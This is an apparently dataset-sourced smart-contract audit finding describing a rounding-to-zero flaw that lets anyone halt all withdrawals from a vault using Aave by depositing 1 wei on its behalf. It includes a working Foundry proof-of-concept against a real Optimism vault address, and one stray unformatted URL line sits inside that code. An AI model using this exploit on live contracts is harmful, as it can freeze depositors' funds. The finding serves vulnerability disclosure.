# [M] Precision loss at AaveLendingPoolAssetGuard will

## Summary
Severity: Medium
Contest weight: 0.7598
Dataset id: 22918
Source: https://huggingface.co/datasets/Zaevlad/audit-findings-dataset
Type: audit-finding

## Details
```solidity
function _withdrawAndTransfer(
    address pool,
    address to,
    uint256 portion
) internal view returns (MultiTransaction[] memory transactions) {
    (address[] memory collateralAssets, uint256[] memory amounts) =
        _calculateCollateralAssets(pool, portion);
    transactions = new MultiTransaction[](collateralAssets.length * 2);
    uint256 txCount;
    for (uint256 i = 0; i < collateralAssets.length; i++) {
        transactions[txCount].to = aaveLendingPool;
        transactions[txCount].txData = abi.encodeWithSelector(
            bytes4(keccak256("withdraw(address,uint256,address)")),
            collateralAssets[i], // receiverAddress
            amounts[i],
            pool // onBehalfOf
        );
        txCount++;
        transactions[txCount].to = collateralAssets[i];
        transactions[txCount].txData = abi.encodeWithSelector(
            bytes4(keccak256("transfer(address,uint256)")),
            to, // recipient
            amounts[i]
        );
        txCount++;
    }
}
```
```solidity
function _calculateCollateralAssets(
    address pool,
    uint256 portion
) internal view returns (address[] memory collateralAssets, uint256[] memory amounts) {
    for (uint256 i = 0; i < length; i++) {
        (aToken, , ) = IAaveProtocolDataProvider(aaveProtocolDataProvider).getReserveTokensAddresses(supportedAssets[i].asset);
        if (aToken != address(0)) {
            amounts[index] = IERC20(aToken).balanceOf(pool);
            if (amounts[index] != 0) {
                collateralAssets[index] = supportedAssets[i].asset;
                amounts[index] = amounts[index].mul(portion).div(10 ** 18);
                index++;
            }
        }
    }
}
```
The amount to withdraw will be calculated as the total collateral multiplied by the portion to withdraw. This means that a Vault holding 100 WETH as collateral in Aave will give 1 WETH to a user who wants to withdraw 1% of the total Vault's liquidity. The issue here is that when the Vault has tiny amounts of collateral on Aave, the resulting amount to withdraw may be rounded down to zero, causing the whole transaction to revert. For example, if an attacker deposits 1 wei of LINK on Aave on behalf of the Vault, the resulting amount to withdraw will be rounded down to zero, and Aave will revert the transaction here:
https://github.com/aave/aave-v3-core/blob/master/contracts/protocol/libraries/logic/ValidationLogic.sol#L101
```solidity
function validateWithdraw(
    DataTypes.ReserveCache memory reserveCache,
    uint256 amount,
    uint256 userBalance
) internal pure {
    require(amount != 0, Errors.INVALID_AMOUNT);
}
```
Moreover, a similar scenario will happen when the Vault has borrowed tiny amounts of debt. When a withdrawal is initiated and the Vault has some debt in Aave, it requests a flash loan to repay a portion of the debt to later withdraw a portion of the collateral and send it to the user that initiated the withdrawal. The function _calculateBorrowAssets will get the debt that the Vault has on Aave and calculate the portion to repay:
```solidity
if (variableDebtToken != address(0)) {
    amounts[index] = IERC20(variableDebtToken).balanceOf(pool);
    if (amounts[index] != 0) {
        borrowAssets[index] = supportedAssets[i].asset;
        amounts[index] = amounts[index].mul(portion).div(10 ** 18);
        interestRateModes[index] = 2;
        index++;
        continue;
    }
}
```
When the Vault has a tiny amount of tokens as debt, the resulting amount to repay will be rounded down to zero and Aave will revert the transaction here:
https://github.com/aave/aave-v3-core/blob/master/contracts/protocol/libraries/logic/ValidationLogic.sol#L330
```solidity
function validateRepay(
    DataTypes.ReserveCache memory reserveCache,
    uint256 amountSent,
    DataTypes.InterestRateMode interestRateMode,
    address onBehalfOf,
    uint256 stableDebt,
    uint256 variableDebt
) internal view {
    require(amountSent != 0, Errors.INVALID_AMOUNT);
}
```
In conclusion, when the Vault has tiny amounts of collateral or tiny amounts of debt, all withdrawals will be halted because the amounts to withdraw/repay will be rounded down to zero. Withdrawals on the Vault will be halted when the Vault has tiny amounts of tokens as collateral or debt. Anyone can deposit 1 wei of a collateral token on Aave on behalf of the Vault to trigger this bug. The manager can also take a tiny amount of debt on behalf of the Vault to make all withdrawals revert. This issue directly breaks a restriction stated in the README:
Depositor under any circumstances should be able to withdraw funds they've invested according to the value of their vault shares given that no lock up is applied. Moreover, this issue doesn't depend on any conditions or external states so I believe it warrants high severity.

## Proof of Concept
The following PoC is a test that forks the Optimism blockchain and executes the attack on a Vault. The test can be pasted in any Foundry environment and can be run with the command forge test --match-test test_withdrawal_aave. Additionally, you must have the following lines in the .env file for the test to fork the blockchain:
OPTIMISM_RPC_URL=https://opt-mainnet.g.alchemy.com/v2/{key}
```solidity
// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity 0.8.13;
import {Test} from "forge-std/Test.sol";
interface IPoolLogic {
    function withdraw(uint256 _fundTokenAmount) external;
    function balanceOf(address owner) external view returns (uint256);
}
interface IAavePool {
    function deposit(address, uint256, address, uint16) external;
}
interface IERC20 {
    function approve(address spender, uint256 amount) external returns (bool);
}
contract PoolTest is Test {
    IPoolLogic pool = IPoolLogic(0x749E1d46C83f09534253323A43541A9d2bBD03AF);
    address randomUser = 0xeFc4904b786A3836343A3A504A2A3cb303b77D64;
    address attacker = makeAddr("attacker");
    IAavePool aaveLendingPool = IAavePool(0x794a61358D6845594F94dc1DB02A252b5b4814aD);
    IERC20 WETH = IERC20(0x4200000000000000000000000000000000000006);
    string OPTIMISM_RPC_URL = vm.envString("OPTIMISM_RPC_URL");
    function setUp() public {
        // Create Optimism fork
        uint256 opFork = vm.createSelectFork(OPTIMISM_RPC_URL);
        assertEq(opFork, vm.activeFork());
        vm.rollFork(121_348_913); // Jun-13-2024 04:36:43 PM +UTC
    }
    function test_withdrawal_aave() public {
        // Attacker deposits 1 wei of collateral in Aave on behalf of the Vault
        deal(address(WETH), attacker, 1);
        vm.startPrank(attacker);
        WETH.approve(address(aaveLendingPool), 1);
        aaveLendingPool.deposit(address(WETH), 1, address(pool), 0);
        vm.stopPrank();
        // Some user tries to withdraw from the Vault but is reverted
        vm.startPrank(randomUser);
        assertEq(pool.balanceOf(randomUser), 44.998230150000000000e18);
        // Error 26 in Aave is 'INVALID_AMOUNT' - check it out here:
        https://github.com/aave/aave-v3-core/blob/master/contracts/protocol/libraries/helpers/Errors.sol#L35
        vm.expectRevert(bytes("26"));
        pool.withdraw(10e18);
    }
}
```
The test above demonstrates how can any attacker deposit a tiny amount of collateral in Aave on behalf of the Vault in order to halt all withdrawals. In a similar way, the manager could borrow a tiny amount of tokens from Aave and withdrawals would also halt because the Vault would try to repay 0 amount to Aave.

## Recommendation
To mitigate this issue is recommended to not call withdraw or repay on Aave if the input amount is zero.
